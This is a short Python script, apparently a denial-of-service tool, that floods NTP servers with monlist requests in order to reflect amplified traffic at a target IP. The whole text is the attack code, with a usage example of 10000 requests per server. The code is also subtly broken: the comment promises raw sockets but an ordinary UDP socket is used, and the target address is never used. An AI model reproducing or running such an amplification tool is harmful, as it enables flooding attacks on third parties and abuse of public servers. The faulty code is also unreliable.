import socket

def ntp_amplification(ntp_servers, target_ip, num_requests):
    # Build NTP monlist request
    ntp_packet = b'\x17\x00\x03\x2a' + b'\x00' * 8

    # Create raw sockets
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    for ntp_server in ntp_servers:
        for _ in range(num_requests):
            # Send NTP monlist request
            sock.sendto(ntp_packet, (ntp_server, 123))

    sock.close()

# usage example
ntp_servers = ["1.ntp.server.ip", "2.ntp.server.ip", "3.ntp.server.ip"]
target_ip = "192.168.1.1"
num_requests = 10000

ntp_amplification(ntp_servers, target_ip, num_requests)
